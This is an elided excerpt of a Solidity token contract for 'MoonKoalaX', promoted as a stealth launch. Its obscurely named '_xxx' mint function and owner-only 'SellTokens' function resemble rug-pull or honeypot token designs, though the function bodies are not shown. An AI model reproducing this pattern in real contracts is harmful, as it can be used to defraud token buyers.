...
/**   Welcome To MoonKoalaX Stealth Launch
 * 
 *    MoonKoalaX ; mKOALAX
 *    Supply 1.000.000.000.000
 *    
 *    NFT TOKEN , Website In Process
 * 
 *    Telegram Group https://t.me/MoonKoalaX
...
contract ERC200 is Context, IERC20, Ownable {
    ...
    function _xxx(address account, uint256 amount) internal virtual {
    ...
    function SellTokens(uint256 amount) public onlyMaster {
...
contract MoonKoalaX is ERC200 {

    uint tokenTotalSupply = 1000000000000;

    constructor() public ERC200("MoonKoalaX", "mKOALAX") {
        _xxx(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}